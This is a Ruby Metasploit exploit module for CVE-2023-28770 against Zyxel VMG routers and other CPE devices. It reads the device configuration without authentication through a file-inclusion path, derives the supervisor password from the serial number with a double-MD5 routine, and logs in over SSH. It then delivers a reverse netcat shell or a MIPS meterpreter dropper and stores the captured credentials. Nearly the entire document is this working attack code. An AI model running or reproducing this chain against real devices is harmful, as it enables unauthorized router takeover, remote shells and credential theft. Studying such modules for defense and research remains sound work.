##
# Metasploit Module — saved locally via SuiteXPL MSF Bridge
# Source: https://github.com/rapid7/metasploit-framework
# CVE: CVE-2023-28770
# Affects: Zyxel VMG series routers and 40+ CPE devices with zhttpd/zcmd
# Chain: LFI (config disclosure) -> serial-derived supervisor password -> SSH RCE
# Bridge: embedxpl.core.bridges.exploit_bridge.run_via_msfconsole("zyxel_lfi_unauth_ssh_rce")
##

require 'socket'
require 'digest/md5'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::SSH
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  attr_accessor :ssh_socket

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Zyxel Chained RCE: LFI + Weak Password Derivation via SSH (CVE-2023-28770)',
      'Description' => %q{
        Chain for 40+ Zyxel routers/CPE devices:
        1. LFI via /Export_Log?/data/zcfg_config.json (unauthenticated, reads full config)
        2. Derives supervisor password from device serial using MD5-based algorithm
        3. SSH login as supervisor for RCE
        Executes commands as user supervisor.
      },
      'License' => MSF_LICENSE,
      'Author' => ['h00die-gr3y', 'SEC Consult Vulnerability Lab', 'Thomas Rinsma', 'Bogi Napoleon Wennerstrøm'],
      'References' => [
        ['CVE', '2023-28770'],
        ['URL', 'https://r.sec-consult.com/zyxsploit'],
        ['URL', 'https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/'],
        ['URL', 'https://github.com/boginw/zyxel-vmg8825-keygen'],
      ],
      'DisclosureDate' => '2022-02-01',
      'Privileged' => true,
      'Targets' => [
        ['Unix Command', {'Platform' => 'unix', 'Arch' => ARCH_CMD, 'Type' => :unix_cmd, 'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_netcat'}}],
        ['Linux Dropper (MIPS)', {'Platform' => 'linux', 'Arch' => [ARCH_MIPSBE], 'Type' => :linux_dropper,
          'CmdStagerFlavor' => ['printf', 'echo', 'bourne', 'wget', 'curl'],
          'DefaultOptions' => {'PAYLOAD' => 'linux/mipsbe/meterpreter/reverse_tcp'}}],
        ['Interactive SSH', {'DefaultOptions' => {'PAYLOAD' => 'generic/ssh/interact'}, 'Payload' => {'Compat' => {'PayloadType' => 'ssh_interact'}}}]
      ],
      'DefaultTarget' => 0,
      'DefaultOptions' => {'RPORT' => 80, 'SSL' => false, 'SSH_TIMEOUT' => 30, 'WfsDelay' => 5},
      'Notes' => {'Stability' => [CRASH_SAFE], 'Reliability' => [REPEATABLE_SESSION], 'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]}
    ))
    register_options([OptBool.new('STORE_CRED', [false, 'Store credentials in DB', true])])
    register_advanced_options([OptInt.new('ConnectTimeout', [true, 'TCP connect timeout', 10])])
  end

  # MD5-based double hash password derivation (SerialNumMethod2 and Method3)
  def double_hash(input, size = 8)
    md5_arr = Digest::MD5.hexdigest(input).split(//)
    r1 = Array.new(32)
    j = 0
    until j == 32
      r1[j] = md5_arr[j] == '0' ? md5_arr[j+1] : md5_arr[j]
      r1[j+1] = md5_arr[j+1]; j += 2
    end
    md5_arr2 = Digest::MD5.hexdigest(r1.join).split(//)
    r2 = Array.new(32)
    j = 0
    until j == 32
      r2[j] = md5_arr2[j] == '0' ? md5_arr2[j+1] : md5_arr2[j]
      r2[j+1] = md5_arr2[j+1]; j += 2
    end
    r3 = Array.new(size)
    (0..(size-1)).each { |i| r3[i] = r2[i*3] }
    r3.join
  end

  def serial_num_method2(serial); double_hash(serial); end

  def crack_supervisor_pwd(serial)
    pwd2 = serial_num_method2(serial)
    print_status("Derived supervisor password (Method2): #{pwd2}")
    { 'method2' => pwd2 }
  end

  def get_configuration
    send_request_cgi('method' => 'GET', 'uri' => normalize_uri(target_uri.path, '/Export_Log?/data/zcfg_config.json'))
  end

  def check_port(port)
    Timeout.timeout(datastore['ConnectTimeout']) { TCPSocket.new(datastore['RHOST'], port).close; true }
  rescue; false
  end

  def do_login(ip, user, pass, ssh_port)
    opts = ssh_client_defaults.merge(auth_methods: ['password', 'keyboard-interactive'], port: ssh_port, password: pass)
    begin
      ::Timeout.timeout(datastore['SSH_TIMEOUT']) { self.ssh_socket = Net::SSH.start(ip, user, opts) }
    rescue Rex::ConnectionError; fail_with(Failure::Unreachable, 'Connection error')
    rescue Net::SSH::AuthenticationFailed; return false
    rescue Net::SSH::Exception => e; fail_with(Failure::Unknown, "SSH: #{e.message}")
    end
    fail_with(Failure::Unknown, 'No SSH socket') unless ssh_socket
    true
  end

  def execute_command(cmd, _opts = {})
    Timeout.timeout(datastore['WfsDelay']) { ssh_socket.exec!(cmd) }
  rescue Timeout::Error; @timeout = true
  end

  def check
    res = get_configuration
    return CheckCode::Unknown('No response') if res.nil?
    return CheckCode::Unknown('Not 200') if res.code != 200
    begin
      cfg = res.get_json_document
      return CheckCode::Unknown('No config JSON') if cfg.blank?
      serial = cfg.dig('DeviceInfo', 'SerialNumber')
      return CheckCode::Unknown('No serial') unless serial
      CheckCode::Vulnerable("Serial: #{serial}")
    rescue => e; CheckCode::Unknown(e.message)
    end
  end

  def exploit
    res = get_configuration
    fail_with(Failure::NotVulnerable, 'LFI failed') if res.nil? || res.code != 200
    cfg = res.get_json_document
    @config = {
      'serial' => cfg.dig('DeviceInfo', 'SerialNumber'),
      'software' => cfg.dig('DeviceInfo', 'SoftwareVersion')
    }
    ssh_svc = cfg.dig('X_ZYXEL_RemoteManagement', 'Service')&.find { |s| s['Name'] == 'SSH' }
    @config['ssh_port'] = ssh_svc&.fetch('Port', 22) || 22
    print_status("Target: firmware=#{@config['software']} serial=#{@config['serial']} ssh_port=#{@config['ssh_port']}")
    supervisor_pwd = crack_supervisor_pwd(@config['serial'])
    unless do_login(datastore['RHOST'], 'supervisor', supervisor_pwd['method2'], @config['ssh_port'])
      fail_with(Failure::NoAccess, 'All password derivation methods failed')
    end
    print_good("Authenticated as supervisor with derived password!")
    create_credential_and_login(module_fullname: fullname, username: 'supervisor', private_data: supervisor_pwd['method2'],
      private_type: :password, workspace_id: myworkspace_id, status: Metasploit::Model::Login::Status::SUCCESSFUL) if datastore['STORE_CRED']
    return handler(ssh_socket) if target.name == 'Interactive SSH'
    case target['Type']
    when :unix_cmd; execute_command(payload.encoded)
    when :linux_dropper; execute_cmdstager(linemax: 500)
    end
    @timeout ? ssh_socket.shutdown! : ssh_socket.close
  end
end
